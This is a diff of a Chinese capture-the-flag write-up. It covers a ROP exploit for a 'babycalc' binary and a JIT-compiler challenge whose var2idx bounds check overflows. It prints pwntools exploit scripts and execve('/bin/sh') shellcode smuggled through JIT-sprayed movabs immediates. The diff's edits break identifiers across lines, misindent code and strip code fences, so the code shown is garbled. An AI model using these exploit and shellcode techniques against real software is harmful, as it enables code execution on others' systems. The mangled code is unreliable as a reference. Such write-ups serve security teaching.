@@ -149,7 +149,12 @@ p.interactive()
 
 jit
 
-1、题目提供了一个将中间代码编译为机器码并执行的JIT编译器，实现了函数调用与返回值，位运算，局部变量等功能，但是没有提供运行时输入/输出的功能。程序启动时输入用户给出的IR码，用mmap申请一块带可执行权限的内存区域做JIT输出区，通过调用链Compiler::main() -> 循环Compiler::handleFn(){Compiler::creatFunc();Compiler::handleFnBody();}完成IR的编译，最后通过Compiler::clrstk();entry();执行编译后的机器码。
+1、题目提供了一个将中间代码编译为机器码并执行的JIT编译器，实现了函数调用与返回值，位运算，局部变量等功能，但是没有提供运行时输入/输出的功能。程序启动时输入用户给出的IR码，用mmap申请一块带可执行权限的内存区域做JIT输出区，通过调用链Compiler::
+main() -> 循环Compiler::
+handleFn(){Compiler::
+creatFunc();Compiler::
+handleFnBody();}完成IR的编译，最后通过Compiler::
+clrstk();entry();执行编译后的机器码。
 
 opcode
 名称
@@ -191,7 +196,8 @@ call
 funcid(1byte) retval_var(1byte) len_args(1byte) len * var(1byte)
 函数调用，funcid为被调用函数id，retval为接收返回值的变量序号，len_args为参数数量，随后len_args个变量序号
 
-5、攻击面寻找：上文已经分析过，此题不是堆溢出/栈溢出的题目，需要在JIT层找攻击面。由于不带输入输出功能，首先排除JIT后代码的栈溢出漏洞。由于IR中没有数组访问功能，所以排除了数组访问时类型混淆/整数溢出导致的OOB。但是本题目提供了函数传参和局部变量功能，一般函数局部变量都存储在栈上，我们考虑审计局部变量访问时的边界检查。反编译Compiler::var2idx如下
+5、攻击面寻找：上文已经分析过，此题不是堆溢出/栈溢出的题目，需要在JIT层找攻击面。由于不带输入输出功能，首先排除JIT后代码的栈溢出漏洞。由于IR中没有数组访问功能，所以排除了数组访问时类型混淆/整数溢出导致的OOB。但是本题目提供了函数传参和局部变量功能，一般函数局部变量都存储在栈上，我们考虑审计局部变量访问时的边界检查。反编译Compiler::
+var2idx如下
 
 函数调用约定分析：JIT编译后调用entry函数，entry被写入如下汇编
 
@@ -248,11 +254,6 @@ if S.check() == sat:  
           print hex(m[a[i]].as_long())
 
 # result="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
-```
-
-
-
-```
 0x13
 0x24
 0x35
@@ -269,13 +270,8 @@ if S.check() == sat:  
 0xc7
 0x18
 0x3
-```
-
-
-
-```
 from pwn import *
-#context.log_level="debug"
+    #context.log_level="debug"
 context.arch="amd64"
 
 p=process("./babycalc")
@@ -310,7 +306,7 @@ pay=str(byte).ljust(8,"x00")
 pay+=p64(ret)*21+rop1
 pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
 pay=pay.ljust((0x100-4),"2")+p32(0x38)
-#gdb.attach(p,"b *0x4007D4")
+    #gdb.attach(p,"b *0x4007D4")
 ru(":")
 
 sd(pay)
@@ -338,12 +334,8 @@ ru(":")
 sd(pay)
 
 p.interactive()
-```
-
-
-
-```
-char __cdecl Compiler::var2idx(u8 varib)
+char __cdecl Compiler::
+var2idx(u8 varib)
 {
   char result; // al
   u8 variba; // [rsp+Ch] [rbp-1Ch]
@@ -352,7 +344,8 @@ char __cdecl Compiler::var2idx(u8 varib)
     fatal(); //如果变量序号为0，那么报错，说明序号从1开始
   if ( (varib & 0x80u) == 0 )
   { //变量序号最高位为0，访问参数
-    if ( varib > Compiler::ctx_args )
+    if ( varib > Compiler::
+ctx_args )
       fatal(); //若序号大于当前函数的参数数量则报错
     if ( (char)(8 * varib) <= 0 )
       fatal(); //检查result是否溢出
@@ -361,7 +354,8 @@ char __cdecl Compiler::var2idx(u8 varib)
   else
   {
     variba = varib ^ 0x80;
-    if ( variba > Compiler::ctx_locals ) //若访问变量序号大于局部变量数，则报错
+    if ( variba > Compiler::
+ctx_locals ) //若访问变量序号大于局部变量数，则报错
       fatal();
     if ( (char)(-8 * variba) > 0 )
       fatal(); //检查溢出，负数乘以正数若大于0显然溢出。但是这里没有检查等于0的情况，尽管variba!=0，仍然可能因为溢出导致-8*variba==0，例如variba=32时
@@ -369,31 +363,11 @@ char __cdecl Compiler::var2idx(u8 varib)
   }
   return result; //返回和变量序号有关的某个偏移
 }
-```
-
-
-
-```
 lea    rbp,[rsp-0x8] #设置rbp为被调用函数入口时的rsp
 call func0 #调用序号为0的函数
 hlt
-```
-
-
-
-```
 48 81 ec xx xx xx xx : sub rsp,0x...(imm32)
-```
-
-
-
-```
 48 8d 7d xx lea rdi,[rbp+idx]
-```
-
-
-
-```
 ...         <- rsp
 -----------
 | local 2 |
@@ -406,24 +380,9 @@ hlt
 -----------
 | arg   2 |
 -----------
-```
-
-
-
-```
 48 be xx xx xx xx xx xx xx xx movabs rsi,0x.......(imm64)
-```
-
-
-
-```
 0x0: movabs rsi,imm64(shellcode指令1，jmp rip+2)
 0x10: movabs rsi,imm64(shellcode指令2,jmp rip+2)
-```
-
-
-
-```
 push /shx00
 pop rax
 shl rax,32
@@ -437,11 +396,6 @@ xor rdx,rdx #rdx=0
 push 0x3b #execve
 pop rax
 syscall
-```
-
-
-
-```
 payload=b""
 def newfunc(id,args,locals,retidx,ir): #创建函数
     global payload
@@ -475,11 +429,6 @@ def exploit(p):
     sc+=jop(b"x6ax3bx58x0fx05") #syscall execve
     newfunc(1,0,1,L(1),sc) # jop链的容器函数，无作用只放置jop
     p.send(payload)
-```
-
-
-
-```
 from pwn import *
 context(os = "linux", arch = "amd64", log_level = "debug")
 
